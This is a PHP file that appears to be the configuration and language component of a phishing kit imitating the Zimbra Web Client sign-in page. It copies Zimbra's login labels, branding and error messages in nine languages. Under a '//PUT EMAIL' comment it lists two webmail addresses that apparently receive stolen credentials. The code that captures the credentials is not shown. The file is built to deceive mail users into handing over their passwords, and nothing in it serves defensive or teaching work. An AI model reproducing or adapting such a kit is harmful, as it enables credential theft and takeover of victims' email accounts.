<?php
error_reporting(0);
session_start();
$service = "Zimbra";

//PUT EMAIL
$sen = "baarkyy1@gmail.com,baarkyy@yahoo.com";

$lang_list = array('ar','de','en','es','fr','ja','it','ru','zh');

if($_GET['ln']){
	
	$lang = ($_GET['ln']) ? $_GET['ln'] : $_COOKIE['lnfk'];
	setcookie("lnfk", $lang, time()+43200, "/");

}else{
	
	$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
	setcookie("lnfk", $lang, time()+43200);

}

if (in_array(trim($lang), $lang_list)) {
	
    $lang = $lang;
	
}else{
	
	$lang = 'en';
	
}

$l['en'] = array(
	
	'title'			=> 'Zimbra Web Client Sign In',
	'descr'			=> 'Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.',
	
	'l_username' 	=> 'Username',
	'l_pwd' 		=> 'Password',
	'l_button' 		=> 'Sign In',
	'l_stay' 		=> 'Stay signed in',
	
	'l_version' 	=> 'Version',
	
	'l_select' 		=> array(
						'Default',
						'Advanced (Ajax)',
						'Standard (HTML)',
						'Mobile'
					),
	
	'l_what' 		=> 'What\'s This?',
	
	'l_what_title'	=> 'Client Types',
	'l_what_text'	=> '<strong>Advanced</strong> offers the full set of Web collaboration features. This Web Client works best with newer browsers and faster Internet connections. <br><br> <strong>Standard</strong> is recommended when Internet connections are slow, when using older browsers, or for easier accessibility. <br><br> <strong>Mobile</strong> is recommended for mobile devices. <br><br> To set <strong>Default</strong> to be your preferred client type, change the sign in options in your Preferences, General tab after you sign in.',
	
	'l_offline' 	=> 'Go offline with Zimbra Desktop. Learn more',
	
	'l_footer1' 	=> 'Zimbra :: the leader in open source messaging and collaboration :: Blog - Wiki - Forums',
	'l_footer2' 	=> 'Copyright © 2005-2018 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.',
	
	'l_error'		=> 'The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password.',
	
	
);

$l['ru'] = array(
	
	'title'			=> 'Вход в веб-клиент Zimbra',
	'descr'			=> 'Zimbra предоставляет open source-сервер и клиентское приложение для обмена сообщениями и групповой работы. Подробнее можно узнать здесь: https://www.zimbra.com.',
	
	'l_username' 	=> 'Имя пользователя',
	'l_pwd' 		=> 'Пароль',
	'l_button' 		=> 'Вход',
	'l_stay' 		=> 'Запомнить меня',
	
	'l_version' 	=> 'Версия',
	
	'l_select' 		=> array(
						'По умолчанию',
						'Расширенный (AJAX)',
						'Стандартный (HTML)',
						'Мобильный телефон'
					),
	
	'l_what' 		=> 'Что это такое?',
	
	'l_what_title'	=> 'Типы клиента',
	'l_what_text'	=> '<strong>Расширенный</strong> — предлагает полный набор функций совместной работы в сети. Веб-клиент работает лучше всего с новыми версиями браузеров и быстрым подключением к Интернету. <br><br> <strong>Стандартная</strong> версия клиента рекомендуется для медленного подключения к Интернету, при использовании старых версий браузеров или для упрощенного доступа.  <br><br> <strong>Мобильный</strong> — рекомендуется для мобильных устройств.  <br><br> Чтобы назначить <strong>Стандартную</strong> версию предпочтительным типом клиента, после входа в систему измените параметры входа, используя окно «Настройки», вкладку «Общие».',
	
	'l_offline' 	=> 'Автономная работа с Zimbra Desktop. Подробнее',
	
	'l_footer1' 	=> 'Zimbra :: лидер open source-программ для обмена сообщениями и групповой работы :: Блог — Вики — Форумы',
	'l_footer2' 	=> '© VMware, Inc., 2005–2018 г. VMware и Zimbra являются зарегистрированными товарными знаками или товарными знаками корпорации VMware, Inc. ',
	
	'l_error'		=> 'Неверное имя пользователя или пароль. Проверьте, не включен ли режим CAPS LOCK, и введите повторно текущие имя пользователя и пароль.',
	
	
);

$l['fr'] = array(
	
	'title'			=> 'Connexion de client Web Zimbra',
	'descr'			=> 'Zimbra propose des solutions de messagerie et de collaboration Open Source (serveur et client). Pour plus de détails, visitez https://www.zimbra.com.',
	
	'l_username' 	=> 'Utilisateur',
	'l_pwd' 		=> 'Mot de passe',
	'l_button' 		=> 'Connexion',
	'l_stay' 		=> 'Mémoriser mes valeurs d\'accès',
	
	'l_version' 	=> 'Version',
	
	'l_select' 		=> array(
						'Par défaut',
						'Évolué (Ajax)',
						'Standard (HTML)',
						'Portable'
					),
	
	'l_what' 		=> 'En savoir plus',
	
	'l_what_title'	=> 'Types de client',
	'l_what_text'	=> 'L’option <strong>Évolué</strong> propose la gamme complète des fonctionnalités de collaboration Web. Ce client Web fonctionne plus efficacement avec les versions les plus récentes des navigateurs et une connexion Internet plus rapide. <br><br> L’option <strong>Standard</strong> est conseillée avec les connexions Internet lentes, avec les versions moins récentes des navigateurs et pour les utilisateurs à accessibilité réduite.   <br><br> L’option <strong>Mobile</strong> est conseillée pour les terminaux mobiles.  <br><br> Pour utiliser <strong>Par défaut</strong> comme type de client, il suffit de modifier les options de connexion  : ouvrez une session, déroulez le menu Préférences et activez l’onglet Généralités.',
	
	'l_offline' 	=> 'Naviguez hors ligne avec Zimbra Desktop. En savoir plus',
	
	'l_footer1' 	=> 'Zimbra, le spécialiste des logiciels de messagerie et de collaboration Open Source Blog - Wiki - Forums',
	'l_footer2' 	=> 'Copyright © 2005-2018 VMware, Inc. VMware et Zimbra sont des marques déposées ou des marques commerciales de VMware, Inc. ',
	
	'l_error'		=> 'Le nom d\'utilisateur ou le mot de passe est incorrect. Vérifiez que la touche de verrouillage majuscule n\'est pas activée, puis retapez votre nom d\'utilisateur ou votre mot de passe.',
	
	
);

$l['de'] = array(
	
	'title'			=> 'Beim Zimbra-Webclient anmelden',
	'descr'			=> 'Zimbra bietet OpenSource-Server- und Client-Software für Kommunikationsdienste. Weitere Informationen finden Sie unter https://www.zimbra.com.',
	
	'l_username' 	=> 'Nutzername',
	'l_pwd' 		=> 'Passwort',
	'l_button' 		=> 'Anmelden',
	'l_stay' 		=> 'Zugang speichern',
	
	'l_version' 	=> 'Version',
	
	'l_select' 		=> array(
						'Voreinstellung',
						'Erweitert (Ajax)',
						'Standard (HTML)',
						'Mobil'
					),
	
	'l_what' 		=> 'Was ist das?',
	
	'l_what_title'	=> 'Client-Typen',
	'l_what_text'	=> '<strong>Erweitert</strong> bietet die gesamte Palette an Funktionen für die Zusammenarbeit im Web. Dieser Webclient funktioniert am besten mit neuen Browsern und schnellen Internet-Verbindungen.  <br><br> <strong>Standard</strong> – wird für langsame Internetverbindungen, ältere Browser oder einfachere Zugänglichkeit empfohlen.    <br><br> <strong>Mobil</strong> wird für Mobilgeräte empfohlen.  <br><br> Wenn Sie den <strong>Standard</strong>-Client als bevorzugten Client-Typ einstellen möchten, ändern Sie nach dem Anmelden Ihre Anmeldeoptionen in den Einstellungen im Register "Allgemein".',
	
	'l_offline' 	=> 'Gehen Sie offline mit Zimbra Desktop. Weitere Informationen',
	
	'l_footer1' 	=> 'Zimbra: der führende Anbieter von OpenSource-Kommunikationsdiensten: Blog - Wiki - Foren',
	'l_footer2' 	=> 'Copyright © 2005-2018 VMware, Inc. VMware und Zimbra sind eingetragene Warenzeichen oder Warenzeichen von VMware, Inc.',
	
	'l_error'		=> 'Der Nutzername oder das Passwort ist falsch. Stellen Sie sicher, dass die Feststelltaste nicht aktiviert ist, und geben Sie dann Nutzernamen und Passwort erneut ein.',
	
	
);

$l['it'] = array(
	
	'title'			=> 'Accesso al client Web Zimbra',
	'descr'			=> 'Zimbra fornisce software per server e client open source per messaggistica e collaborazione. Per saperne di più, visita https://www.zimbra.com.',
	
	'l_username' 	=> 'Nome utente',
	'l_pwd' 		=> 'Password',
	'l_button' 		=> 'Entra',
	'l_stay' 		=> 'Ricordami',
	
	'l_version' 	=> 'Versione',
	
	'l_select' 		=> array(
						'Predefinito',
						'Avanzato (Ajax)',
						'Standard (HTML)',
						'Cellulare'
					),
	
	'l_what' 		=> 'Che cos\'è questo?',
	
	'l_what_title'	=> 'Tipi di client',
	'l_what_text'	=> '<strong>Avanzato</strong> offre la serie completa di funzioni di collaborazione web. Questo client web funziona meglio se si usano browser aggiornati e connessioni Internet più veloci.   <br><br> <strong>Standard</strong> è consigliato con connessioni Internet lente, quando si usano browser meno recenti o per un accesso più semplice.  <br><br> <strong>Mobile</strong> è consigliato per i dispositivi mobili.   <br><br> Per impostare su <strong>Predefinito</strong> il tipo di client preferito, modifica le opzioni di accesso nelle Preferenze della scheda Generale dopo aver eseguito l\'accesso.',
	
	'l_offline' 	=> 'Lavora offline con Zimbra Desktop. Ulteriori informazioni',
	
	'l_footer1' 	=> 'Zimbra :: il leader per le soluzioni di messaggistica e collaborazione open source Blog - Wiki - Forum',
	'l_footer2' 	=> 'Copyright © 2005-2018 VMware, Inc. VMware e Zimbra sono marchi o marchi registrati di VMware, Inc. ',
	
	'l_error'		=> 'Il nome utente o la password sono errati. Verifica che non sia stato premuto il tasto Blocca maiuscole e inserisci di nuovo nome utente e password.',
	
	
);

$l['es'] = array(
	
	'title'			=> 'Inicio de sesión en el cliente web de Zimbra',
	'descr'			=> 'Zimbra ofrece un servidor y software de código abierto para la comunicación y colaboración. Para más información, visita https://www.zimbra.com.',
	
	'l_username' 	=> 'Nombre de usuario',
	'l_pwd' 		=> 'Contraseña',
	'l_button' 		=> 'Iniciar sesión',
	'l_stay' 		=> 'Recordarme',
	
	'l_version' 	=> 'Versión',
	
	'l_select' 		=> array(
						'Predeterminada',
						'Avanzada (Ajax)',
						'Estándar (HTML)',
						'Móvil'
					),
	
	'l_what' 		=> '¿Qué es esto?',
	
	'l_what_title'	=> 'Tipos de clientes',
	'l_what_text'	=> '<strong>Avanzado</strong> ofrece el pack completo de funciones para la colaboración en la web. Este cliente web funciona mejor con navegadores más actuales y conexiones a Internet más rápidas.    <br><br> <strong>Estándar</strong>: se recomienda cuando la conexión a Internet es lenta o al usar una versión antigua de navegador o para un acceso más fácil.   <br><br> <strong>Móvil</strong> se recomiendo para dispositivos móviles.  <br><br> Para usar la versión <strong>Predeterminada</strong> como tu tipo de cliente preferido, cambia las opciones de conexión en tus Preferencias y la pestaña General después de iniciar sesión.',
	
	'l_offline' 	=> 'Desconectarse con Zimbra Desktop. Más información',
	
	'l_footer1' 	=> 'Zimbra : el líder en la mensajería abierta y colaboración: Blog - Wiki - Foros',
	'l_footer2' 	=> 'Copyright © 2005-2018 VMware, Inc. VMware y Zimbra son marcas comerciales o marcas comerciales registradas de VMware, Inc. .',
	
	'l_error'		=> 'El nombre de usuario o la contraseña son incorrectos. Comprueba que no esté activada la tecla Bloq Mayús y vuelve a introducir el nombre de usuario y contraseña.',
	
	
);

$l['zh'] = array(
	
	'title'			=> 'Zimbra 网络客户端登录',
	'descr'			=> 'Zimbra 可为通信和协同办公提供开源服务器和客户端软件。 详情请见 https://www.zimbra.com。',
	
	'l_username' 	=> '用户名',
	'l_pwd' 		=> '密码',
	'l_button' 		=> '登录',
	'l_stay' 		=> '记住我',
	
	'l_version' 	=> '版本',
	
	'l_select' 		=> array(
						'默认',
						'高级 (Ajax)',
						'标准 (HTML)',
						'手机'
					),
	
	'l_what' 		=> '这是什么？',
	
	'l_what_title'	=> '客户端类型',
	'l_what_text'	=> '<strong>高级</strong> - 提供全套 Web 协同功能。该 Web 客户端最适合使用新版浏览器和更快的 Internet 连接。  <br><br> <strong>标准</strong> - 在 Internet 连接较慢、使用旧版浏览器，或为方便访问时，建议使用该类型。 <br><br> <strong>移动</strong> - 移动设备建议使用该类型。  <br><br> 要将首选的客户端类型设为<strong>默认</strong>，请在登录后前往“首选项”->“常规”选项卡更改选项中的符号。',
	
	'l_offline' 	=> '使 Zimbra Desktop 处于离线状态。了解详细信息',
	
	'l_footer1' 	=> 'Zimbra ::开源通讯和协作办公系统的业界领袖 :: 博客 - Wiki - 论坛',
	'l_footer2' 	=> '版权所有© 2005-2018 VMware, Inc.。VMware 和 Zimbra 是 VMware, Inc. 的注册商标或商标。 ',
	
	'l_error'		=> '用户名或密码不正确。 检查 CAPS LOCK 键，然后重新输入用户名或密码。',
	
	
);

$l['ar'] = array(
	
	'title'			=> 'تسجيل دخول عميل الويب من Zimbra‏',
	'descr'			=> 'توفر Zimbra برمجيات الملقم والعميل للمراسلة والتعاون على أساس المصدر المفتوح. للتعرف على المزيد، قم بزيارة https://www.zimbra.com.',
	
	'l_username' 	=> 'اسم المستخدم',
	'l_pwd' 		=> 'كلمة المرور',
	'l_button' 		=> 'تسجيل دخول',
	'l_stay' 		=> ' تذكرني',
	
	'l_version' 	=> 'الإصدار',
	
	'l_select' 		=> array(
						'افتراضي',
						'تقدم (Ajax)',
						'قياسي (HTML)',
						'الهاتف المحمول'
					),
	
	'l_what' 		=> 'ما هذا؟',
	
	'l_what_title'	=> 'أنواع العملاء',
	'l_what_text'	=> '<strong>متقدم</strong> -  يوفر مجموعة كاملة من ميزات تعاون الويب. يعمل عميل الويب هذا بصورة أفضل مع المستعرضات الأحدث واتصالات الإنترنت الأسرع.   <br><br> <strong>قياسي</strong> -  عندما تكون اتصالات الإنترنت بطيئة أو عند استخدام مستعرضات أقدم أو لوصول أسهل.  <br><br> يوصى باستخدام وضع     <strong>محمول</strong>  للأجهزة المحمولة.   <br><br> لضبط النوع <strong>الافتراضي</strong> ليكون نوع العميل المفضل لديك، يجب تغيير خيارات تسجيل الدخول في علامة التبويب عام أسفل التفضيلات بعد تسجيل دخولك.',
	
	'l_offline' 	=> 'قطع الاتصال بـ Zimbra Desktop. Learn more',
	
	'l_footer1' 	=> 'Zimbra :: الرائد في مجال المراسلة والتعاون على أساس المصدر المفتوح :: مدونة - ويكي - منتديات',
	'l_footer2' 	=> 'حقوق الطبع والنشر © 2005-2018- VMware, Inc. تعتبر VMware وZimbra علامات تجارية مسجلة أو علامات تجارية مملوكة لشركة VMware, Inc.',
	
	'l_error'		=> 'اسم المستخدم أو كلمة المرور غير صحيحة. تحقق من عدم تنشيط CAPS LOCK، ثم أعد كتابة اسم المستخدم وكلمة المرور الحالية.',
	
	
);

$l['ja'] = array(
	
	'title'			=> 'Zimbraウェブクライアントログイン',
	'descr'			=> 'Zimbraは、メッセージングおよびコラボレーションのためのオープンソースサーバーとクライアントソフトウェアを提供します。 詳細については、https://www.zimbra.comをご覧ください。',
	
	'l_username' 	=> 'ユーザー名',
	'l_pwd' 		=> 'パスワード',
	'l_button' 		=> 'ログイン',
	'l_stay' 		=> 'このユーザー情報を保存',
	
	'l_version' 	=> 'クライアント',
	
	'l_select' 		=> array(
						'デフォルト',
						'アドバンスト (Ajax)',
						'標準 (HTML)',
						'モバイル'
					),
	
	'l_what' 		=> 'ヘルプ',
	
	'l_what_title'	=> 'クライアントの種類',
	'l_what_text'	=> '<strong>アドバンスト（Ajax）</strong>はすべてのウェブコラボレーション機能を提供します。このウェブクライアントは、使用するブラウザが新しいほど、またインターネット接続の速度が速いほど、快適に機能します。 <br><br> <strong>標準（HTML）</strong> は、インターネット接続が遅い場合、使用しているブラウザが古い場合、または手軽さを求める場合にお勧めします。  <br><br> <strong>モバイル</strong>はスマートフォン等のモバイルデバイスにお勧めします。  <br><br> デフォルトを優先するクライアントの種類に設定する場合は、ログイン後に[プリファレンス]の[全般]タブでログインオプションを変更します。',
	
	'l_offline' 	=> 'Zimbra Desktopを使用してオフラインにします。詳細',
	
	'l_footer1' 	=> 'Zimbra：オープンソースメッセージングおよびコラボレーションのリーダー：Zimbraブログ Zimbra Wiki',
	'l_footer2' 	=> 'Copyright © 2005-2018 VMware, Inc. All rights reserved. VMware および Zimbra は VMware, Inc. の登録商標または商標です。 ',
	
	'l_error'		=> 'ユーザー名またはパスワードが正しくありません。CAPS LOCKがオンになっていないことを確認してから、現在のユーザー名とパスワードを入力し直してください。',
	
	
);


?>